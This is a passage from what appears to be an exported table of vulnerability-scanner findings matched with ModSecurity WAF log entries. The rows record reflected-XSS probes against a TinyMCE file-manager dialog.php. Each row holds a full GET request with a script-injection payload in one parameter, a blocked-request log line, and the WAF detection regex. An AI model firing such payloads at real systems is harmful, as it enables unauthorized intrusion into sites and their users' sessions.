Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=1al5u414bu7nvh185njse2db52
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:11</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:09 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(424599)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRts0awQAW0AAB7zKNMAAAAF&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts0awQAW0AAB7zKNMAAAAF</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366855</td><td class=xl24 width=64 >2015-03-31 20:47:27</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >field_id</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&quot;&gt;&lt;script&gt;alert(814999)&lt;/script&gt;&lt;!--&amp;relative_0=TestName&amp;akey=key&amp;fldr=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=2kural7di5jfqm3ofvldmdek03
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:12</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:11 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:field_id. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(814999)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRts06wQAW0AAHhGMtwAAAAK&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts06wQAW0AAHhGMtwAAAAK</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366856</td><td class=xl24 width=64 >2015-03-31 20:49:28</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac26aa50f8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >crossdomain</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain='&gt;&lt;script&gt;alert(449699)&lt;/script&gt;&lt;!--&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=TestName&amp;551ac26aa50f8=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=g5m7j2hb70ho5k27cdoqup54g4
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:13</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:12 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:crossdomain. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(449699)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRts1KwQAW0AAHzDqsIAAAAH&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts1KwQAW0AAHzDqsIAAAAH</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366857</td><td class=xl24 width=64 >2015-03-31 20:50:52</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >relative_url</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url='&gt;&lt;script&gt;alert(454999)&lt;/script&gt;&lt;!--&amp;akey=key&amp;fldr=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=m2e4fsfusgl8ngtn9q206fba55
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:14</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:13 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:relative_url. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(454999)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRts1awQAW0AAHewA9IAAAAN&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts1awQAW0AAHewA9IAAAAN</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366858</td><td class=xl24 width=64 >2015-03-31 20:52:36</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >akey</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=&quot;&gt;&lt;script&gt;alert(137699)&lt;/script&gt;&lt;!--&amp;fldr=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=d9o4ccilc597832u1t7mrtpep7
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:16</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:14 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:akey. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(137699)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRts1qwQAW0AABvT@G4AAAAL&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts1qwQAW0AABvT@G4AAAAL</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366859</td><td class=xl24 width=64 >2015-03-31 20:54:20</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >akey</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=&quot;&gt;&lt;script&gt;alert(277799)&lt;/script&gt;&lt;!--&amp;fldr=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=jj4qm3psk6amlbush4h5bhaah0
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:17</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:16 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:akey. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(277799)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRts2KwQAW0AAD9hYN4AAAAC&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts2KwQAW0AAD9hYN4AAAAC</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366860</td><td class=xl24 width=64 >2015-03-31 20:54:34</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac26aa50f8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >field_id</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id='&gt;&lt;script&gt;alert(831499)&lt;/script&gt;&lt;!--&amp;relative_url=0&amp;akey=key&amp;fldr=TestName&amp;551ac26aa50f8=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=g1srh0dmsqovqm9fur0vo07m07
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:18</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:17 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:field_id. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(831499)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRts2awQAW0AAHhB77YAAAAD&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts2awQAW0AAHhB77YAAAAD</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366861</td><td class=xl24 width=64 >2015-03-31 20:56:03</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >fldr</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=&quot;&gt;&lt;script&gt;alert(253799)&lt;/script&gt;&lt;!-- HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%22%3Ealert%28253799%29%2F; PHPSESSID=qn6g5a94k9j534ijdbv0hnkjg3
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:19</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:18 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:fldr. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(253799)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/responsivefilemanager/dialog.php&quot;] [unique_id &quot;VRts2qwQAW0AABt@bV0AAAAB&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRts2qwQAW0AABt@bV0AAAAB</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 